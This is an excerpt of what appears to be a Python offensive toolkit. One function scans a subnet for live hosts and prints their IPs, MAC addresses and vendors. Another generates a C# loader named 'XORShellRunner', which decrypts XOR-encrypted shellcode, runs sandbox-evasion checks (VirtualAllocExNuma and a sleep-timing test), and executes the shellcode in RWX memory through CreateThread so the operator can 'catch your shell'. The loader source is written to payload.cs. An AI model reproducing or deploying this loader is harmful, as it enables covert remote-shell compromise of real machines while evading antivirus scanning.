...
def discovery_host(subnet_address):
    ...
    print("-----------------------------------------------------------------------")
    print(" {:<20} {:^20} {:>20} ".format("No", "IP address", "Status"))
        ...
        for j in results[i]:
            if 'state' == j:
                for k in results[i][j]:
                    if 'state' == k:
                        if 'up' == results[i][j][k]:
                            print(" {:<20} {:^20} {:>20} ".format(str(count), i, results[i][j][k]))
                            newlist.append(i)

    print(f"-----------------------------------------------------------------------")
    print(" {:<20} {:^20} {:>20} ".format("No", "Mac Address", "Name Device"))
    print(f"-----------------------------------------------------------------------")
    ...
    for i in results:
        count = count + 1
        for j in results[i]:
            if 'macaddress' == j and results[i][j] != None:
                if 'addr' and 'vendor' in results[i][j]:
                    print(" {:<20} {:^20} {:>20} ".format(str(count), results[i][j]['addr'], results[i][j]['vendor']))
...
def create_method_1():
    ...
    print("Success!")
    print("[+]Making exe")
    payload_cs = "using System; using System.Text; using System.Runtime.InteropServices; namespace XORShellRunner { public class Program { public const uint EXECUTEREADWRITE = 0x40; public const uint COMMIT_RESERVE = 0x1000; [DllImport(\"kernel32\")] public static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocExNuma( IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred); [DllImport(\"kernel32.dll\")] static extern void Sleep(uint dwMilliseconds); [DllImport(\"kernel32.dll\")] static extern IntPtr GetCurrentProcess(); private static byte[] xor(byte[] cipher, byte[] key) { byte[] xored = new byte[cipher.Length]; for (int i = 0; i < cipher.Length; i++) { xored[i] = (byte)(cipher[i] ^ key[i % key.Length]); } return xored; } private static void copy(Byte[] Patch, IntPtr Address, int length) { Marshal.Copy(Patch, 0, Address, length); } static void Main(string[] args) { Console.WriteLine(\"[+] Running sandbox evasion using the non-emulated API VirtualAllocExNuma\"); IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0); if (mem == null) { Console.WriteLine(\"(VirtualAllocExNuma) [-] Failed check\"); return; } Console.WriteLine(\"[+] Delay of three seconds for scan bypass check\"); DateTime time1 = DateTime.Now; Sleep(3000); double time2 = DateTime.Now.Subtract(time1).TotalSeconds; if (time2 < 2.5) { Console.WriteLine(\"(Sleep) [-] Failed check\"); return; } Console.WriteLine(\"[+] Decrypting shellcode\"); string key = \"" + f"{key}" + "\"; " + f"{encrypted_out}" + "byte[] shellcode; shellcode = xor(xorshellcode, Encoding.ASCII.GetBytes(key)); Console.WriteLine(\"[+] Allocate memory in the current process\"); int size = shellcode.Length; UInt32 codeAddr = VirtualAlloc(0, (UInt32)size, COMMIT_RESERVE, EXECUTEREADWRITE); Console.WriteLine(\"[+] Copying shellcode into allocated memory space\"); copy(shellcode, (IntPtr)(codeAddr), size); Console.WriteLine(\"[+] Creating thread and running...catch your shell\"); IntPtr threadHandle = IntPtr.Zero; UInt32 threadId = 0; IntPtr parameter = IntPtr.Zero; threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId); WaitForSingleObject(threadHandle, 0xFFFFFFFF); return; } } }"
    f = open("payload.cs", "w")
    f.write(payload_cs)
    f.close()
